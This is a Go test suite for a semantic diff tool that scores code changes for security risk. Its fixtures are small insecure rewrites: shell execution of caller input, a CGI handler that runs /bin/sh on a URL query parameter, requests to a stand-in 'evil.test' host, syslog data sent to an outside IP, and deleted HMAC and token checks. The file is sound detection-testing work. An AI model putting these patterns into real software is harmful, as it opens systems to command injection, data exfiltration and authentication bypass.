package api_test

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/BlackVectorOps/semantic_firewall/v6/pkg/api"
	"github.com/BlackVectorOps/semantic_firewall/v6/pkg/models"
)

// diffSources writes each version into its own directory (so the two files
// are never loaded as one package) and returns the semantic diff.
func diffSources(t *testing.T, oldSrc, newSrc string) *models.DiffOutput {
	t.Helper()
	dir := t.TempDir()
	write := func(sub, src string) string {
		p := filepath.Join(dir, sub, "x.go")
		if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(p, []byte(src), 0o644); err != nil {
			t.Fatal(err)
		}
		return p
	}
	out, err := api.Diff(write("old", oldSrc), write("new", newSrc))
	if err != nil {
		t.Fatalf("Diff: %v", err)
	}
	return out
}

func findFunc(t *testing.T, out *models.DiffOutput, name string) models.FunctionDiff {
	t.Helper()
	for _, f := range out.Functions {
		if f.Function == name {
			return f
		}
	}
	t.Fatalf("function %q not in diff output: %+v", name, out.Functions)
	return models.FunctionDiff{}
}

// A capability swapped in for an existing call leaves the number of distinct
// call targets unchanged; it must still be flagged as high risk.
func TestDiffRisk_CapabilitySwapIsHighRisk(t *testing.T) {
	const old = `package x

import "fmt"

func Handle(cmd string) error {
	fmt.Println(cmd)
	return nil
}
`
	cases := map[string]struct {
		src, capability string
	}{
		"net.Dial": {`package x

import "net"

func Handle(cmd string) error {
	net.Dial("tcp", cmd)
	return nil
}
`, "Capability+network(net.Dial)"},
		"exec.Command": {`package x

import "os/exec"

func Handle(cmd string) error {
	return exec.Command("sh", "-c", cmd).Run()
}
`, "Capability+exec("},
		"syscall.Exec": {`package x

import "syscall"

func Handle(cmd string) error {
	return syscall.Exec(cmd, nil, nil)
}
`, "Capability+exec(syscall.Exec)"},
	}
	for name, tc := range cases {
		t.Run(name, func(t *testing.T) {
			out := diffSources(t, old, tc.src)
			f := findFunc(t, out, "Handle")
			if f.RiskScore < models.RiskScoreHigh {
				t.Errorf("risk = %d (%s); want >= %d", f.RiskScore, f.TopologyDelta, models.RiskScoreHigh)
			}
			if !strings.Contains(f.TopologyDelta, tc.capability) {
				t.Errorf("delta = %q; want it to name %q", f.TopologyDelta, tc.capability)
			}
			if out.Summary.HighRiskChanges == 0 {
				t.Error("summary.high_risk_changes = 0")
			}
		})
	}
}

// Ordinary churn -- new benign calls, a new loop, an added validation branch,
// and the package-initializer calls a new import adds to init -- must stay
// below the high-risk threshold.
func TestDiffRisk_BenignChurnStaysBelowThreshold(t *testing.T) {
	const old = `package x

func Sum(xs []int) int {
	return len(xs)
}
`
	const new = `package x

import (
	"errors"
	"fmt"
	"strconv"
	"strings"
)

func Sum(xs []int) int {
	if len(xs) > 1000 {
		fmt.Println(errors.New("input too large: " + strconv.Itoa(len(xs))))
		return 0
	}
	total := 0
	for _, x := range xs {
		total += x
	}
	fmt.Println(strings.Repeat("=", total%3))
	return total
}
`
	out := diffSources(t, old, new)
	for _, f := range out.Functions {
		if f.RiskScore >= models.RiskScoreHigh {
			t.Errorf("%s: risk = %d (%s); benign churn must stay below %d",
				f.Function, f.RiskScore, f.TopologyDelta, models.RiskScoreHigh)
		}
	}
	if out.Summary.HighRiskChanges != 0 {
		t.Errorf("summary.high_risk_changes = %d; want 0", out.Summary.HighRiskChanges)
	}
}

// A capability added to an existing closure, or to a range-over-func loop
// body (a synthetic closure), is scored on that closure's own diff entry.
func TestDiffRisk_CapabilityInsideClosures(t *testing.T) {
	t.Run("closure", func(t *testing.T) {
		out := diffSources(t, `package x

func Serve(addrs []string) {
	f := func(a string) { println(a) }
	for _, a := range addrs {
		f(a)
	}
}
`, `package x

import "os/exec"

func Serve(addrs []string) {
	f := func(a string) { exec.Command(a).Run() }
	for _, a := range addrs {
		f(a)
	}
}
`)
		if f := findFunc(t, out, "Serve$1"); f.RiskScore < models.RiskScoreHigh {
			t.Errorf("Serve$1 risk = %d (%s); want >= %d", f.RiskScore, f.TopologyDelta, models.RiskScoreHigh)
		}
	})

	t.Run("range-over-func", func(t *testing.T) {
		out := diffSources(t, `package x

import "slices"

func Serve(addrs []string) {
	for a := range slices.Values(addrs) {
		println(a)
	}
}
`, `package x

import (
	"os/exec"
	"slices"
)

func Serve(addrs []string) {
	for a := range slices.Values(addrs) {
		exec.Command(a).Run()
	}
}
`)
		// The loop body is a synthetic closure ("Serve$1") with its own
		// diff entry; the capability is scored there, not on Serve.
		var body *models.FunctionDiff
		for i, f := range out.Functions {
			if strings.HasPrefix(f.Function, "Serve$") {
				body = &out.Functions[i]
			}
		}
		if body == nil {
			t.Fatalf("range-over-func body missing from diff: %+v", out.Functions)
		}
		if body.RiskScore < models.RiskScoreHigh {
			t.Errorf("%s risk = %d (%s); want >= %d", body.Function, body.RiskScore, body.TopologyDelta, models.RiskScoreHigh)
		}
	})
}

// Methods on package-local types used to fail Zipper alignment outright
// (the receiver type from each load is a distinct types.Type), leaving the
// diff with no ops and no risk.
func TestDiffRisk_MethodOnLocalType(t *testing.T) {
	out := diffSources(t, `package x

import "fmt"

type T struct{ name string }

func (t *T) Do() { fmt.Println(t.name) }
`, `package x

import "net"

type T struct{ name string }

func (t *T) Do() { net.Dial("tcp", t.name) }
`)
	f := findFunc(t, out, "(*T).Do")
	if f.Status != models.StatusModified {
		t.Fatalf("status = %q; want modified", f.Status)
	}
	if len(f.AddedOps) == 0 {
		t.Error("added_ops is empty; the Zipper did not align the method")
	}
	if f.MatchedNodes == 0 {
		t.Error("matched_nodes = 0; the receiver parameter was not aligned")
	}
	if f.RiskScore < models.RiskScoreHigh {
		t.Errorf("risk = %d (%s); want >= %d", f.RiskScore, f.TopologyDelta, models.RiskScoreHigh)
	}
}

// A new function is scored for what it reaches, not merely for existing.
func TestDiffRisk_AddedFunction(t *testing.T) {
	const old = `package x

func A() {}
`
	out := diffSources(t, old, `package x

import "fmt"

func A() {}

func B(s string) { fmt.Println(s) }
`)
	if f := findFunc(t, out, "B"); f.RiskScore >= models.RiskScoreHigh {
		t.Errorf("benign added function risk = %d (%s); want < %d", f.RiskScore, f.TopologyDelta, models.RiskScoreHigh)
	}

	out = diffSources(t, old, `package x

import "os/exec"

func A() {}

func B(s string) { exec.Command(s).Run() }
`)
	if f := findFunc(t, out, "B"); f.RiskScore < models.RiskScoreHigh {
		t.Errorf("added exec function risk = %d (%s); want >= %d", f.RiskScore, f.TopologyDelta, models.RiskScoreHigh)
	}
}

// The default fingerprint masks string literals and integers outside
// [-16, 16]; a change confined to such literals must still be reported, with
// the changed literal visible in the ops.
func TestDiff_LiteralOnlyChangesAreModified(t *testing.T) {
	cases := map[string]struct{ old, new, wantOp string }{
		"url": {`package x

import "net/http"

func Fetch() (*http.Response, error) { return http.Get("http://good.test") }
`, `package x

import "net/http"

func Fetch() (*http.Response, error) { return http.Get("http://evil.test") }
`, "evil.test"},
		"file mode": {`package x

import "os"

func Save(b []byte) error { return os.WriteFile("cfg", b, 0o600) }
`, `package x

import "os"

func Save(b []byte) error { return os.WriteFile("cfg", b, 0o777) }
`, "511"},
		"size limit": {`package x

func Check(b []byte) bool { return len(b) <= 1024 }
`, `package x

func Check(b []byte) bool { return len(b) <= 1048576 }
`, "1048576"},
	}
	for name, tc := range cases {
		t.Run(name, func(t *testing.T) {
			out := diffSources(t, tc.old, tc.new)
			var f *models.FunctionDiff
			for i := range out.Functions {
				if out.Functions[i].Function != "init" {
					f = &out.Functions[i]
				}
			}
			if f == nil || f.Status != models.StatusModified {
				t.Fatalf("literal-only change not reported as modified: %+v", out.Functions)
			}
			if !strings.Contains(strings.Join(f.AddedOps, "\n"), tc.wantOp) {
				t.Errorf("added_ops %v do not show %q", f.AddedOps, tc.wantOp)
			}
		})
	}
}

// Identical inputs must produce identically ordered output.
func TestDiff_DeterministicOrder(t *testing.T) {
	const src = `package x

func A() int { return 1 }
func B() int { return 2 }
func C() int { return 3 }
func D() int { return 4 }
func E() int { return 5 }
func F() int { return 6 }
`
	order := func() string {
		out := diffSources(t, src, src)
		var names []string
		for _, f := range out.Functions {
			names = append(names, f.Function)
		}
		return strings.Join(names, ",")
	}
	first := order()
	for i := 0; i < 5; i++ {
		if got := order(); got != first {
			t.Fatalf("run %d order %q differs from first %q", i, got, first)
		}
	}
}

// The GitHub Action passes an empty file or /dev/null for the missing side
// of an added or deleted file.
func TestDiff_EmptyInputHasNoFunctions(t *testing.T) {
	dir := t.TempDir()
	empty := filepath.Join(dir, "empty.go")
	present := filepath.Join(dir, "present.go")
	if err := os.WriteFile(empty, nil, 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(present, []byte("package x\n\nfunc A() {}\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	for _, old := range []string{empty, os.DevNull} {
		out, err := api.Diff(old, present)
		if err != nil {
			t.Fatalf("Diff(%s, present): %v", old, err)
		}
		if out.Summary.Added == 0 {
			t.Errorf("Diff(%s, present): want the function reported as added; got %+v", old, out.Summary)
		}
	}
}

// Removing a verification call deletes a guard; it must be flagged even
// though removing structure is otherwise neutral.
func TestDiffRisk_RemovedVerification(t *testing.T) {
	t.Run("check removed from function", func(t *testing.T) {
		out := diffSources(t, `package x

import "crypto/hmac"

func Accept(mac, want []byte) bool {
	if !hmac.Equal(mac, want) {
		return false
	}
	return true
}
`, `package x

func Accept(mac, want []byte) bool {
	return true
}
`)
		f := findFunc(t, out, "Accept")
		if f.RiskScore < models.RiskScoreHigh || !strings.Contains(f.TopologyDelta, "RemovedCheck(crypto/hmac.Equal)") {
			t.Errorf("risk = %d (%s); want a high-risk RemovedCheck", f.RiskScore, f.TopologyDelta)
		}
	})

	t.Run("validator function deleted", func(t *testing.T) {
		out := diffSources(t, `package x

import "crypto/subtle"

func valid(token, want string) bool {
	return subtle.ConstantTimeCompare([]byte(token), []byte(want)) == 1
}

func Open(token string) bool { return valid(token, "secret") }
`, `package x

func Open(token string) bool { return true }
`)
		f := findFunc(t, out, "valid")
		if f.Status != models.StatusRemoved || f.RiskScore < models.RiskScoreHigh {
			t.Errorf("removed validator: status %q risk %d (%s); want removed and high risk", f.Status, f.RiskScore, f.TopologyDelta)
		}
		if out.Summary.HighRiskChanges == 0 {
			t.Error("summary.high_risk_changes = 0")
		}
	})

	t.Run("unrelated function removed", func(t *testing.T) {
		out := diffSources(t, `package x

func helper() int { return 1 }

func A() int { return 2 }
`, `package x

func A() int { return 2 }
`)
		if f := findFunc(t, out, "helper"); f.RiskScore != 0 {
			t.Errorf("benign removal risk = %d; want 0", f.RiskScore)
		}
	})
}

// Capabilities reached through less common standard-library entry points
// escalate like their direct equivalents.
func TestDiffRisk_IndirectStdlibCapabilities(t *testing.T) {
	cases := []struct {
		name, fn, oldSrc, newSrc, class string
	}{
		{"cgi handler", "Handle", `package p
import "net/http"
func Handle(w http.ResponseWriter, r *http.Request) { w.WriteHeader(200) }`, `package p
import (
	"net/http"
	"net/http/cgi"
)
func Handle(w http.ResponseWriter, r *http.Request) {
	h := &cgi.Handler{Path: "/bin/sh", Args: []string{"-c", r.URL.Query().Get("c")}}
	h.ServeHTTP(w, r)
}`, "exec"},
		{"syslog dial", "Report", `package p
import "fmt"
func Report(data string) { fmt.Println(data) }`, `package p
import "log/syslog"
func Report(data string) {
	w, _ := syslog.Dial("tcp", "203.0.113.5:514", syslog.LOG_INFO, "x")
	w.Info(data)
}`, "network"},
		{"os.Root mutation", "Save", `package p
import "os"
func Save(dir string, data []byte) error { _, err := os.Stat(dir); return err }`, `package p
import "os"
func Save(dir string, data []byte) error {
	r, err := os.OpenRoot(dir)
	if err != nil {
		return err
	}
	return r.WriteFile("y", data, 0o600)
}`, "filesystem"},
		{"httptest listener", "Proxy", `package p
import "net/url"
func Proxy(target string) string { u, _ := url.Parse(target); return u.String() }`, `package p
import (
	"net/http/httptest"
	"net/http/httputil"
	"net/url"
)
func Proxy(target string) string {
	u, _ := url.Parse(target)
	srv := httptest.NewUnstartedServer(httputil.NewSingleHostReverseProxy(u))
	srv.Start()
	return srv.URL
}`, "network"},
		{"os.CopyFS", "Install", `package p
import "os"
func Install(src, dst string) error { _ = os.DirFS(src); return nil }`, `package p
import "os"
func Install(src, dst string) error { return os.CopyFS(dst, os.DirFS(src)) }`, "filesystem"},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			f := findFunc(t, diffSources(t, c.oldSrc, c.newSrc), c.fn)
			if f.RiskScore < models.RiskScoreHigh || !strings.Contains(f.TopologyDelta, "Capability+"+c.class) {
				t.Errorf("risk %d, delta %q; want >= %d with Capability+%s", f.RiskScore, f.TopologyDelta, models.RiskScoreHigh, c.class)
			}
		})
	}
}

// Inserting a closure shifts the creation numbers of later closures. Pairing
// must follow content, so the risk lands on the inserted code and the
// unchanged closure is preserved.
func TestDiff_InsertedClosureIsPairedByContent(t *testing.T) {
	t.Run("risky closure inserted", func(t *testing.T) {
		out := diffSources(t, `package p
import "os/exec"
func Deploy(target string) error {
	build := func() error { return exec.Command("go", "build", target).Run() }
	return build()
}`, `package p
import "os/exec"
func Deploy(target string) error {
	fetch := func() error { return exec.Command("sh", "-c", target).Run() }
	if err := fetch(); err != nil {
		return err
	}
	build := func() error { return exec.Command("go", "build", target).Run() }
	return build()
}`)
		if f := findFunc(t, out, "Deploy$1 → Deploy$2"); f.Status != models.StatusPreserved {
			t.Errorf("unchanged go-build closure: status %q; want preserved", f.Status)
		}
		added := findFunc(t, out, "Deploy$1")
		if added.Status != models.StatusAdded || added.RiskScore < models.RiskScoreHigh {
			t.Errorf("inserted sh -c closure: %+v; want added with risk >= %d", added, models.RiskScoreHigh)
		}
	})
	t.Run("benign closure inserted", func(t *testing.T) {
		out := diffSources(t, `package p
import "os/exec"
func Build(target string) error {
	run := func() error { return exec.Command("make", target).Run() }
	return run()
}`, `package p
import (
	"fmt"
	"os/exec"
)
func Build(target string) error {
	logf := func() { fmt.Println("building", target) }
	logf()
	run := func() error { return exec.Command("make", target).Run() }
	return run()
}`)
		if out.Summary.HighRiskChanges != 0 {
			t.Errorf("adding a logging closure produced %d high-risk changes: %+v", out.Summary.HighRiskChanges, out.Functions)
		}
		if f := findFunc(t, out, "Build$1 → Build$2"); f.Status != models.StatusPreserved {
			t.Errorf("unchanged exec closure: status %q; want preserved", f.Status)
		}
	})
}

// A check made through an instantiated generic interface keeps its key's
// type arguments apart from the interface's package: swapping the
// interface for one of another package is a RemovedCheck, as it is for a
// plain interface.
func TestDiffRisk_GenericInterfaceCheck(t *testing.T) {
	root := t.TempDir()
	handle := func(pkg, typ string) string {
		return "package h\n\nimport (\n\t\"errors\"\n\n\t\"example.com/m/" + pkg + "\"\n\t\"example.com/m/model\"\n)\n\n" +
			"func Handle(c " + pkg + "." + typ + ", u model.User) error {\n\tif !c.Allow(u) {\n\t\treturn errors.New(\"denied\")\n\t}\n\treturn nil\n}\n"
	}
	ifaces := "import \"example.com/m/model\"\n\ntype Checker[T any] interface{ Allow(T) bool }\n\ntype Plain interface{ Allow(model.User) bool }\n"
	writeFilesIn(t, root, map[string]string{
		"go.mod":           "module example.com/m\n\ngo 1.22\n",
		"model/model.go":   "package model\n\ntype User struct{ Name string }\n",
		"authz/authz.go":   "package authz\n\n" + ifaces,
		"noop/noop.go":     "package noop\n\n" + ifaces,
		"generic/old/h.go": handle("authz", "Checker[model.User]"),
		"generic/new/h.go": handle("noop", "Checker[model.User]"),
		"plain/old/h.go":   handle("authz", "Plain"),
		"plain/new/h.go":   handle("noop", "Plain"),
	})
	for kind, label := range map[string]string{
		"plain":   "RemovedCheck((example.com/m/authz.Plain).Allow)",
		"generic": "RemovedCheck((example.com/m/authz.Checker[example.com/m/model.User]).Allow)",
	} {
		out, err := api.Diff(filepath.Join(root, kind, "old", "h.go"), filepath.Join(root, kind, "new", "h.go"))
		if err != nil {
			t.Fatal(err)
		}
		if f := findFunc(t, out, "Handle"); !strings.Contains(f.TopologyDelta, label) || f.RiskScore < models.RiskScoreHigh {
			t.Errorf("%s: delta %q, score %d; want %s, high risk", kind, f.TopologyDelta, f.RiskScore, label)
		}
	}
}
